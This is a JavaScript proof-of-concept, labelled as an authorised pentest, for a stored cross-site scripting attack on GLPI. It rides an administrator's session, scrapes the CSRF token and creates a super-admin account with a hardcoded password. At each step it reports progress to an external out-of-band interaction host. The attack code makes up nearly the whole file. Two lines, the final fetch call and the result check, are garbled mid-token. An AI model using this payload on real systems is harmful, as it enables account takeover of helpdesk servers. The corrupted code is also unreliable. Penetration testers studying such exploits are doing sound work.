// PT2026-MSSP - PoC autorizado: GLPI stored-XSS -> sesion admin -> crea super-admin de PRUEBA.
(async () => {
  const OOB = 'das4ob5ml5ihodvcopgghz4tid4t8u7pc.oast.online';
  const b = (t) => { try { new Image().src = 'https://' + OOB + '/glpixss-' + t; } catch (e) {} };
  const grab = (re, t) => { const m = t.match(re); return m ? m[1] : ''; };
  try {
    b('run');
    const pref = await (await fetch('/front/preference.php', { credentials: 'include' })).text();
    const who = grab(/name=["']realname["'][^>]*value=["']([^"']*)/i, pref) || 'x';
    b('who-' + encodeURIComponent(who).slice(0, 30));
    const form = await (await fetch('/front/user.form.php', { credentials: 'include' })).text();
    const tok = grab(/_glpi_csrf_token["'] value=["']([a-f0-9]+)/i, form);
    b('tok-' + (tok ? tok.slice(0, 8) : 'none'));
    if (!tok) return;
    const p = new URLSearchParams();
    p.set('_glpi_csrf_token', tok);
    p.set('name', 'pentest-bl0ka');
    p.set('realname', 'BL0KA PENTEST BORRAR');
    p.set('password', 'Bl0ka!PT2026#Xy');
    p.set('password2', 'Bl0ka!PT2026#Xy');
    p.set('authtype', '1');
    p.set('is_active', '1');
    p.set('_profiles_id', '4');
    p.set('_entities_id', '0');
    p.set('_is_recursive', '1');
    p.set('add', '1');
    const r = await fetch('/front/user.form.phpals: 'include', headers: { 'Content-Type':'application/x-www-form-urlencoded' }, body: p.toString() });
    b('add-' + r.status);
    const rt = await r.text();
    b('res-' + (/error|erreur|existe|denied|refil' : 'ok'));
  } catch (e) {
    b('ex');
  }
})();
